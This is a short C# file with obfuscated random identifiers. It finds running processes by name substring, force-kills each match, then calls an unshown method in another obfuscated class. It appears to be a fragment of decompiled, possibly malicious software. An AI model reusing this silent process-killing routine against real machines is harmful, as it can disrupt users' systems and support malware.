using System;
using System.ComponentModel;
using System.Diagnostics;

namespace ALzLGBAFaCqNDAE;

public class JWMMsVgJfXjgr
{
	public static bool UioOCCImtWoFTc(Process wWnsDWKmDbVBl, string wbPfxsKWryJaYk)
	{
		try
		{
			return wWnsDWKmDbVBl.ProcessName.ToLower().Contains(wbPfxsKWryJaYk.ToLower());
		}
		catch (Win32Exception)
		{
			return false;
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void GTbnbywNrELW(string tcApezwrei, string GsWGNnpvPyPmX)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (UioOCCImtWoFTc(process, tcApezwrei.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					RMvUnHFCuFhAD.dBJeYmPfKaJT();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
